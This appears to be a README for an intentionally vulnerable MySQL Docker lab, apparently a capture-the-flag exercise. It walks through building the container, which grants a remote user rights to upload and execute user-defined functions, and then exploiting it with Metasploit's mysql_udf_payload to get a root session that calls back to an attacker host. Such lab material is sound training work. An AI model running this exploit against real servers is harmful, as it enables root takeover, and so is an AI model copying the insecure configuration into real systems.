# Overview
These instructions will create a MySQL 5.7.20 instance inside a Docker container on a Ubuntu 22.04 server. The server is vulnerable to the /multi/mysql/mysql_udf_payload exploit in Metasploit. The MySQL service is running as root, allowing an attacker to gain privilege escalation on the target system. I shouldn't have to say this out loud, but this should ABSOLUTELY NOT under any circumstances be used in a production environment.
# Setup
1. Download files to build container
    ```
    $ wget https://raw.githubusercontent.com/TechGeek001/netsec-db/main/netsecdb-UbuntuServerX86-64.sh
    $ chmod +x netsecdb-UbuntuServerX86-64.sh
    $ ./netsec-db-UbuntuServerX86-64.sh
    ```
2. Navigate to the newly created directory and build the Docker container
    ```
    $ cd netsecdb/UbuntuServerX86-64
    ```
3. Build and run the Docker container
    ```
    $ docker build -t tnetsecdb .
    $ docker run -d --name netsecdb --dns 192.168.25.10 --dns-search netsec-docker.isi.jhu.edu --privileged --network host tnetsecdb:latest
    ```
4. Exec into the Docker container
    ```
    $ docker exec -it netsecdb bash
    ```
5. Finish configuring MySQL (this can't be done during the build)
    ```
    # cd /root
    # chmod +x setup.sh
    # ./setup.sh
    ```
    This script creates a user, allows it to access MySQL both locally and remotely, and gives it permission to upload and execute user-defined functions
# Exploit
This procedure was tested on Kali Linux 22.04 using Metasploit Framework 6.4.2-dev
1. Start the MSF Console
   ```
   $ sudo msfconsole
   ```
2. Select the desired exploit
    ```
    > use exploit/multi/mysql/mysql_udf_payload
    ```
3. Set the correct options. In this example, the attacker is 1.1.1.1 and the victim is 2.2.2.2
    ```
    > set LHOST 1.1.1.1
    > set SRVHOST 1.1.1.1
    > set RHOST 2.2.2.2
    > set USERNAME tiaan.jerjerrod
    > set PASSWORD doubleEFFORT!!
    > set target 1
    > exploit
    ```
    Note: MSF will claim that the exploit fails, but the session is still created. Not sure why this happens.
4. Open the session (in this example, it is session 1) and test to see which user this payload is running as.
    ```
    > sessions -i 1
    > show guid
    Server username: root
    ```
5. The flag is located in ```/home/admin```.
# Notes
1. The MySQL login credentials can be changed by editing ```UbuntuServerX86-64/config_mysql.txt```
2. The flag filename and contents can be changed by editing ```UbuntuServerX86-64/Dockerfile``` below the ```#this is the flag``` comment
